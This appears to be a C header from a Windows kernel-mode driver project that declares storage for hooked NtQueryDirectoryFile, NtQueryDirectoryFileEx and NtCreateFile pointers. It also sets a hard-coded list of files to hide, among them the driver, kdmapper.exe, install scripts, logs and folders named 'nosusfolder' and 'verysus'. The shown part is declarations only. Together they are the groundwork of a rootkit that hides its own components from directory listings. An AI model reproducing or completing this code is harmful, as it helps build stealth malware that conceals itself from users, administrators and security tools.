#pragma once
#include <wdm.h>


// Default memory pool "array" to hold original data of all hooks via (size1, ogdata1, size2, ogdata2 ... i(size1) + sizeof(size1) + size1 = i(size2)):
PVOID OriginalNtQueryDirFile = NULL;
PVOID OriginalNtQueryDirFileEx = NULL;
PVOID OriginalNtCreateFile = NULL;

// Default memory pool "array" to hold all files or paths to hide via (size1, file1, size2, file2 ... i(size1) + sizeof(size1) + size1 = i(size2)):
const WCHAR* DefaultFileObjs[] = { L"MainMedium.exe", L"KMDFdriver.sys", L"AutoStart.exe",
                                L"MediumLogFile.txt", L"ServiceLog.txt", L"DriverDominance.txt",
                                L"kdmapper.exe", L"meow.sys", L"uninstall.bat", L"install.bat",
                                L"dbghelp.dll", L"symsrv.dll", L"meow_client.exe", L"MeowWrapper.exe",
                                L"nosusfolder", L"verysus", L"KMDFdriver", L"AutoService", L"MainMedium", L"meowguard" };
PVOID HideNameList = NULL;

// Definitions of functions/types:
typedef NTSTATUS(*QueryDirFile)(IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG FileInformationLength,
    IN FILE_INFORMATION_CLASS FileInformationClass,
    IN BOOLEAN ReturnSingleEntry,
    IN PUNICODE_STRING FileName OPTIONAL,
    IN BOOLEAN RestartScan);

typedef NTSTATUS(*QueryDirFileEx)(IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    IN ULONG QueryFlags,
    IN PUNICODE_STRING FileName OPTIONAL);